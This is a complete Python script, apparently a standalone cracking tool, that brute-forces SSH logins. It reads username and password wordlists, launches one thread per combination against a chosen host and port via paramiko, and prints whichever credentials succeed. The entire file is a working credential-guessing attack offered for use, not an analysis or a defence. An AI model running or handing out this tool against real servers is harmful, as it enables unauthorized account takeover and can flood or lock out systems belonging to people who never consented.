#!/usr/bin/env python3
#-*- conding:utf-8 -*-

import paramiko
import threading
import argparse

def sshcrack(host,port,username,password):
	ssh = paramiko.SSHClient()
	try:
		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)
		ssh.connect(host,port,username,password)
		ssh.close()
		print("succeed host:%s username:%s password:%s" % (host,username,password))
	except BaseException as err:
		pass

def main():
	parser = argparse.ArgumentParser()
	parser.add_argument("host",help="host")
	parser.add_argument("port",help="port")
	parser.add_argument("userdic",help="userdic eg:user.txt",type=str)
	parser.add_argument("passdic",help="passlist eg:pass.txt",type=str)
	args = parser.parse_args()

	host = args.host
	port = args.port

	userfile = args.userdic
	passfile = args.passdic

	with open(userfile,"r") as f:
		ufile = f.readlines()
	with open(passfile,"r") as f:
		pfile = f.readlines()
	for lineU in ufile:
		username = lineU.strip()
		for lineP in pfile:
			password = lineP.strip()
			print(host,port,username,password)
			t = threading.Thread(target=sshcrack,args=(host,port,username,password))
			t.start()

if __name__ == "__main__":
	print("start")
	main()
